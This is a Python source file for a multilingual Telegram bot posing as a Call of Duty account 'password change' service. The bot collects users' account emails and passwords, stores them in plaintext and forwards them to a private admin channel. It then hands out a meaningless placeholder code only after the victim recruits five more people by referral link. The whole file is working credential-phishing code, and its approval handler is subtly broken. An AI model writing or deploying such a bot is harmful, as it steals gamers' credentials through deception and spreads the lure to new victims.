import asyncio
import logging
import os
import re
import aiosqlite
import aiohttp
from aiohttp import web
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application

# ================= تنظیمات اولیه =================
import os

# خواندن تنظیمات از Environment Variables رندر
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 123456789))
PRIVATE_CHANNEL_ID = int(os.environ.get("PRIVATE_CHANNEL_ID", -100123456789))
PUBLIC_CHANNEL_ID = int(os.environ.get("PUBLIC_CHANNEL_ID", -100987654321))
PUBLIC_CHANNEL_USERNAME = os.environ.get("PUBLIC_CHANNEL_USERNAME", "YourChannelUsername")
BOT_USERNAME = os.environ.get("BOT_USERNAME", "YourBotUsername")

VIDEO_FILE_ID = os.environ.get("VIDEO_FILE_ID", "")
PHOTO_FILE_ID = os.environ.get("PHOTO_FILE_ID", "")

# رندر به صورت خودکار این متغیر را می‌سازد تا وبهوک ست شود
RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://your-app.onrender.com")

# ================= سیستم چند زبانه =================
T = {
    'fa': {
        'welcome': "🎉 به ربات چنج پسورد کالاف خوش اومدی!\n👇 فیلم آموزش رو ببین:",
        'select_lang': " لطفا زبان خود را انتخاب کنید:",
        'join_channel': "⚠️ برای استفاده از ربات، ابتدا در کانال زیر عضو شوید:",
        'join_btn': "📢 عضویت در کانال", 'check_join': "✅ بررسی عضویت", 'not_joined': "❌ شما هنوز عضو کانال نیستید!",
        'main_menu': "🏠 منوی اصلی:", 'my_accounts': "👤 اکانت های من", 'change_pass': "🔑 چنج پسورد اکانت",
        'enter_email': "📧 لطفا ایمیل اکانت را ارسال کنید:", 'invalid_email': "❌ ایمیل اشتباه است!",
        'duplicate': "⚠️ این ایمیل قبلا ثبت شده!\nلطفا به بخش 'اکانت های من' بروید و آن را ویرایش کنید.",
        'enter_pass': "🔐 لطفا پسورد اکانت را ارسال کنید:", 'select_type': "🛡 نوع اکانت شما چیست؟",
        'type_crack': "💀 خیلی کرک", 'type_semi': "⚠️ نیمه سیف", 'type_safe': "✅ سیف",
        'submitted': "✅ اطلاعات ثبت شد. منتظر تایید ادمین باشید...",
        'admin_req': "🔔 درخواست چنج جدید:\n👤 کاربر: {}\n📧 ایمیل: {}\n🔐 پسورد: {}\n🛡 نوع: {}",
        'approve_btn': "✅ تایید و ارسال به کاربر",
        'success_photo_caption': "🎉 اکانت شما با موفقیت آماده شد!\n👇 برای دریافت کد چنج روی دکمه زیر بزنید:",
        'get_code': "📦 دریافت کد چنج",
        'need_ref': "❌ برای دریافت کد چنج باید ۵ نفر را دعوت کنید!\n\n👥 دعوت شده‌ها: {}/5\n🔗 لینک دعوت شما:\n{}",
        'my_points': "🏆 امتیازات شما (تعداد دعوت): {}", 'acc_list': "📋 لیست اکانت های شما:",
        'no_acc': "❌ شما هیچ اکانتی ثبت نکرده‌اید.", 'edit_menu': "⚙️ ویرایش اکانت {}:",
        'edit_email_btn': "📧 ویرایش ایمیل", 'edit_pass_btn': "🔐 ویرایش پسورد", 'back_btn': "🔙 بازگشت",
        'enter_new_email': "📧 لطفا ایمیل جدید را ارسال کنید:", 'enter_new_pass': "🔐 لطفا پسورد جدید را ارسال کنید:",
        'edit_success': "✅ اطلاعات ویرایش شد و در کانال ادمین نیز بروزرسانی گردید.",
    },
    'en': {
        'welcome': "🎉 Welcome to COD Bot!\n👇 Watch the video:",
        'select_lang': " Select your language:", 'join_channel': "⚠️ Join our channel first:",
        'join_btn': "📢 Join", 'check_join': "✅ Check", 'not_joined': "❌ Not joined yet!",
        'main_menu': "🏠 Main Menu:", 'my_accounts': "👤 My Accounts", 'change_pass': "🔑 Change Pass",
        'enter_email': "📧 Send account email:", 'invalid_email': "❌ Invalid email!",
        'duplicate': "⚠️ Duplicate! Go to 'My Accounts' to edit.",
        'enter_pass': "🔐 Send account password:", 'select_type': "🛡 Account type?",
        'type_crack': "💀 Cracked", 'type_semi': "⚠️ Semi-Safe", 'type_safe': "✅ Safe",
        'submitted': "✅ Submitted. Wait for admin...",
        'admin_req': "🔔 New Request:\n👤 User: {}\n📧 Email: {}\n🔐 Pass: {}\n🛡 Type: {}",
        'approve_btn': "✅ Approve", 'success_photo_caption': "🎉 Account ready!\n👇 Click below:",
        'get_code': "📦 Get Code", 'need_ref': "❌ Invite 5 people first!\n\n👥 Referrals: {}/5\n🔗 Link:\n{}",
        'my_points': "🏆 Points: {}", 'acc_list': "📋 Your Accounts:", 'no_acc': "❌ No accounts.",
        'edit_menu': "⚙️ Edit {}:", 'edit_email_btn': "📧 Edit Email", 'edit_pass_btn': "🔐 Edit Pass", 'back_btn': "🔙 Back",
        'enter_new_email': "📧 Send new email:", 'enter_new_pass': "🔐 Send new pass:",
        'edit_success': "✅ Edited successfully.",
    },
    'ru': {
        'welcome': "🎉 Добро пожаловать!\n👇 Смотрите видео:",
        'select_lang': " Выберите язык:", 'join_channel': "⚠️ Подпишитесь на канал:",
        'join_btn': "📢 Подписаться", 'check_join': "✅ Проверить", 'not_joined': "❌ Не подписаны!",
        'main_menu': "🏠 Меню:", 'my_accounts': "👤 Мои аккаунты", 'change_pass': "🔑 Сменить пароль",
        'enter_email': "📧 Отправьте email:", 'invalid_email': "❌ Неверный email!",
        'duplicate': "⚠️ Дубликат! Зайдите в 'Мои аккаунты'.",
        'enter_pass': "🔐 Отправьте пароль:", 'select_type': "🛡 Тип аккаунта?",
        'type_crack': "💀 Взломан", 'type_semi': "⚠️ Полу-сейф", 'type_safe': "✅ Сейф",
        'submitted': "✅ Отправлено админу...",
        'admin_req': "🔔 Запрос:\n👤 Юзер: {}\n📧 Email: {}\n🔐 Пароль: {}\n🛡 Тип: {}",
        'approve_btn': "✅ Одобрить", 'success_photo_caption': "🎉 Аккаунт готов!\n👇 Жмите ниже:",
        'get_code': "📦 Получить код", 'need_ref': "❌ Пригласите 5 человек!\n\n👥 Инвайты: {}/5\n🔗 Ссылка:\n{}",
        'my_points': "🏆 Баллы: {}", 'acc_list': "📋 Ваши аккаунты:", 'no_acc': "❌ Нет аккаунтов.",
        'edit_menu': "⚙️ Ред. {}:", 'edit_email_btn': "📧 Изм. Email", 'edit_pass_btn': "🔐 Изм. Пароль", 'back_btn': "🔙 Назад",
        'enter_new_email': "📧 Новый email:", 'enter_new_pass': "🔐 Новый пароль:",
        'edit_success': "✅ Успешно изменено.",
    }
}

# ================= دیتابیس =================
class DB:
    def __init__(self, db_name='bot.db'): self.db_name = db_name
    async def setup(self):
        async with aiosqlite.connect(self.db_name) as db:
            await db.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'fa', referrals INTEGER DEFAULT 0, referred_by INTEGER)''')
            await db.execute('''CREATE TABLE IF NOT EXISTS accounts (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, email TEXT, password TEXT, type TEXT, status TEXT DEFAULT 'pending', admin_msg_id INTEGER)''')
            await db.commit()
    async def get_lang(self, user_id):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT lang FROM users WHERE user_id = ?", (user_id,)) as c:
                r = await c.fetchone(); return r[0] if r else 'fa'
    async def set_lang(self, uid, l):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("UPDATE users SET lang=? WHERE user_id=?", (l, uid)); await db.commit()
    async def add_user(self, uid, ref=None):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("INSERT OR IGNORE INTO users (user_id, referred_by) VALUES (?, ?)", (uid, ref)); await db.commit()
    async def add_ref(self, uid):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("UPDATE users SET referrals=referrals+1 WHERE user_id=?", (uid,)); await db.commit()
    async def get_refs(self, uid):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT referrals FROM users WHERE user_id=?", (uid,)) as c: r = await c.fetchone(); return r[0] if r else 0
    async def check_dup(self, uid, email):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id FROM accounts WHERE user_id=? AND email=?", (uid, email)) as c: return await c.fetchone() is not None
    async def add_acc(self, uid, e, p, t):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("INSERT INTO accounts (user_id, email, password, type) VALUES (?,?,?,?)", (uid, e, p, t)) as c: await db.commit(); return c.lastrowid
    async def set_msg_id(self, aid, mid):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("UPDATE accounts SET admin_msg_id=? WHERE id=?", (mid, aid)); await db.commit()
    async def get_accs(self, uid):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT id, email, password, type FROM accounts WHERE user_id=?", (uid,)) as c: return await c.fetchall()
    async def get_acc(self, aid):
        async with aiosqlite.connect(self.db_name) as db:
            async with db.execute("SELECT user_id, email, password, type, admin_msg_id FROM accounts WHERE id=?", (aid,)) as c: return await c.fetchone()
    async def upd_email(self, aid, e):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("UPDATE accounts SET email=? WHERE id=?", (e, aid)); await db.commit()
    async def upd_pass(self, aid, p):
        async with aiosqlite.connect(self.db_name) as db: await db.execute("UPDATE accounts SET password=? WHERE id=?", (p, aid)); await db.commit()

db = DB()
router = Router()

class St(StatesGroup):
    wait_email = State(); wait_pass = State(); wait_type = State()
    wait_edit_email = State(); wait_edit_pass = State()

# ================= کیبوردها =================
def lang_kb(): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🇮🇷 فارسی", callback_data="lang_fa")], [InlineKeyboardButton(text="🇬🇧 English", callback_data="lang_en")], [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru")]])
def join_kb(l): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T[l]['join_btn'], url=f"https://t.me/{PUBLIC_CHANNEL_USERNAME}")], [InlineKeyboardButton(text=T[l]['check_join'], callback_data="check_join")]])
def main_kb(l): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T[l]['change_pass'], callback_data="change_pass")], [InlineKeyboardButton(text=T[l]['my_accounts'], callback_data="my_accounts")]])
def type_kb(l): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T[l]['type_crack'], callback_data="type_crack")], [InlineKeyboardButton(text=T[l]['type_semi'], callback_data="type_semi")], [InlineKeyboardButton(text=T[l]['type_safe'], callback_data="type_safe")]])
def approve_kb(a): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="✅ تایید", callback_data=f"approve_{a}")]])
def get_code_kb(a): return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="📦 دریافت", callback_data=f"get_code_{a}")]])

async def check_mem(bot, uid):
    try:
        m = await bot.get_chat_member(PUBLIC_CHANNEL_ID, uid)
        return m.status not in ['left', 'kicked', 'restricted']
    except: return True

# ================= هندلرها =================
@router.message(CommandStart())
async def start(m: Message, command: CommandObject, state: FSMContext):
    uid = m.from_user.id
    if command.args and command.args.startswith('ref_'):
        try:
            ref = int(command.args.split('_')[1])
            if ref != uid:
                await db.add_user(uid, ref); await db.add_ref(ref)
        except: await db.add_user(uid)
    else: await db.add_user(uid)
    
    l = await db.get_lang(uid)
    if not await check_mem(bot, uid): return await m.answer(T[l]['join_channel'], reply_markup=join_kb(l))
    
    # بررسی وجود ویدیو برای جلوگیری از ارور
    if VIDEO_FILE_ID:
        try:
            await m.answer_video(VIDEO_FILE_ID, caption=T[l]['welcome'], reply_markup=main_kb(l))
        except:
            await m.answer(T[l]['welcome'], reply_markup=main_kb(l))
    else:
        await m.answer(T[l]['welcome'], reply_markup=main_kb(l))

@router.callback_query(F.data == "check_join")
async def c_join(c: CallbackQuery):
    l = await db.get_lang(c.from_user.id)
    if await check_mem(bot, c.from_user.id):
        await c.message.delete()
        await c.message.answer_video(VIDEO_FILE_ID, caption=T[l]['welcome'], reply_markup=main_kb(l))
    else: await c.answer(T[l]['not_joined'], show_alert=True)

@router.callback_query(F.data.startswith("lang_"))
async def c_lang(c: CallbackQuery):
    l = c.data.split('_')[1]; await db.set_lang(c.from_user.id, l)
    await c.message.edit_text(T[l]['main_menu'], reply_markup=main_kb(l))

@router.callback_query(F.data == "change_pass")
async def c_cp(c: CallbackQuery, state: FSMContext):
    l = await db.get_lang(c.from_user.id)
    await state.set_state(St.wait_email); await c.message.answer(T[l]['enter_email'])

@router.message(St.wait_email)
async def s_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id); e = m.text.strip()
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', e): return await m.answer(T[l]['invalid_email'])
    if await db.check_dup(m.from_user.id, e):
        await state.clear(); return await m.answer(T[l]['duplicate'])
    await state.update_data(email=e); await state.set_state(St.wait_pass); await m.answer(T[l]['enter_pass'])

@router.message(St.wait_pass)
async def s_pass(m: Message, state: FSMContext):
    await state.update_data(password=m.text.strip()); await state.set_state(St.wait_type)
    await m.answer(T[await db.get_lang(m.from_user.id)]['select_type'], reply_markup=type_kb(await db.get_lang(m.from_user.id)))

@router.callback_query(St.wait_type)
async def s_type(c: CallbackQuery, state: FSMContext):
    l = await db.get_lang(c.from_user.id); d = await state.get_data()
    aid = await db.add_acc(c.from_user.id, d['email'], d['password'], c.data.split('_')[1])
    txt = T[l]['admin_req'].format(c.from_user.id, d['email'], d['password'], c.data.split('_')[1])
    msg = await bot.send_message(PRIVATE_CHANNEL_ID, txt, reply_markup=approve_kb(aid))
    await db.set_msg_id(aid, msg.message_id)
    await c.message.answer(T[l]['submitted']); await state.clear()

@router.callback_query(F.data.startswith("approve_"))
async def c_app(c: CallbackQuery):
    aid = int(c.data.split('_')[1]); acc = await db.get_acc(aid)
    if acc:
                l = await db.get_lang(acc[0])
    if PHOTO_FILE_ID:
            try:
                await bot.send_photo(acc[0], PHOTO_FILE_ID, caption=T[l]['success_photo_caption'], reply_markup=get_code_kb(aid))
            except:
                await bot.send_message(acc[0], T[l]['success_photo_caption'], reply_markup=get_code_kb(aid))
    else:
            await bot.send_message(acc[0], T[l]['success_photo_caption'], reply_markup=get_code_kb(aid))

@router.callback_query(F.data.startswith("get_code_"))
async def c_code(c: CallbackQuery):
    aid = int(c.data.split('_')[2]); l = await db.get_lang(c.from_user.id); refs = await db.get_refs(c.from_user.id)
    if refs >= 5: await c.message.answer(f"🔑 <code>CHANGE_CODE_{aid}</code>")
    else: await c.message.answer(T[l]['need_ref'].format(refs, f"https://t.me/{BOT_USERNAME}?start=ref_{c.from_user.id}"))

@router.callback_query(F.data == "my_accounts")
async def c_myacc(c: CallbackQuery):
    l = await db.get_lang(c.from_user.id); refs = await db.get_refs(c.from_user.id); accs = await db.get_accs(c.from_user.id)
    txt = f"{T[l]['my_points'].format(refs)}\n\n{T[l]['acc_list']}"
    if not accs: kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T[l]['back_btn'], callback_data="main_menu")]]); txt += f"\n\n{T[l]['no_acc']}"
    else:
        kb = []
        for a in accs: kb.append([InlineKeyboardButton(text=f"{a[1]} ({a[3]})", callback_data=f"edit_{a[0]}")])
        kb.append([InlineKeyboardButton(text=T[l]['back_btn'], callback_data="main_menu")])
        kb = InlineKeyboardMarkup(inline_keyboard=kb)
    await c.message.edit_text(txt, reply_markup=kb)

@router.callback_query(F.data.startswith("edit_"))
async def c_edit(c: CallbackQuery):
    aid = int(c.data.split('_')[1]); l = await db.get_lang(c.from_user.id); acc = await db.get_acc(aid)
    if acc and acc[0] == c.from_user.id:
        kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=T[l]['edit_email_btn'], callback_data=f"req_email_{aid}")], [InlineKeyboardButton(text=T[l]['edit_pass_btn'], callback_data=f"req_pass_{aid}")], [InlineKeyboardButton(text=T[l]['back_btn'], callback_data="my_accounts")]])
        await c.message.edit_text(T[l]['edit_menu'].format(acc[1]), reply_markup=kb)

@router.callback_query(F.data.startswith("req_email_"))
async def req_e(c: CallbackQuery, state: FSMContext):
    await state.update_data(aid=int(c.data.split('_')[2])); await state.set_state(St.wait_edit_email)
    await c.message.answer(T[await db.get_lang(c.from_user.id)]['enter_new_email'])

@router.callback_query(F.data.startswith("req_pass_"))
async def req_p(c: CallbackQuery, state: FSMContext):
    await state.update_data(aid=int(c.data.split('_')[2])); await state.set_state(St.wait_edit_pass)
    await c.message.answer(T[await db.get_lang(c.from_user.id)]['enter_new_pass'])

@router.message(St.wait_edit_email)
async def se_email(m: Message, state: FSMContext):
    l = await db.get_lang(m.from_user.id); e = m.text.strip()
    if not re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+$', e): return await m.answer(T[l]['invalid_email'])
    d = await state.get_data(); aid = d['aid']; await db.upd_email(aid, e)
    acc = await db.get_acc(aid)
    if acc[4]: await bot.edit_message_text(T[l]['admin_req'].format(m.from_user.id, e, acc[2], acc[3]), PRIVATE_CHANNEL_ID, acc[4])
    await m.answer(T[l]['edit_success']); await state.clear()

@router.message(St.wait_edit_pass)
async def se_pass(m: Message, state: FSMContext):
    d = await state.get_data(); aid = d['aid']; p = m.text.strip(); l = await db.get_lang(m.from_user.id)
    await db.upd_pass(aid, p); acc = await db.get_acc(aid)
    if acc[4]: await bot.edit_message_text(T[l]['admin_req'].format(m.from_user.id, acc[1], p, acc[3]), PRIVATE_CHANNEL_ID, acc[4])
    await m.answer(T[l]['edit_success']); await state.clear()

# ================= سرور و Keep-Alive =================
async def keep_alive():
    await asyncio.sleep(60)
    async with aiohttp.ClientSession() as s:
        while True:
            try: await s.get(f"{RENDER_URL}/ping")
            except: pass
            await asyncio.sleep(300)

async def on_startup(app):
    await db.setup()
    await bot.set_webhook(f"{RENDER_URL}/webhook")
    asyncio.create_task(keep_alive())

def main():
    app = web.Application()
    app.router.add_get('/ping', lambda r: web.Response(text='OK'))
    SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path='/webhook')
    setup_application(app, dp, bot=bot)
    app.on_startup.append(on_startup)
    web.run_app(app, host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

if __name__ == "__main__":
    dp = Dispatcher(); dp.include_router(router)
    bot = Bot(BOT_TOKEN)
    main()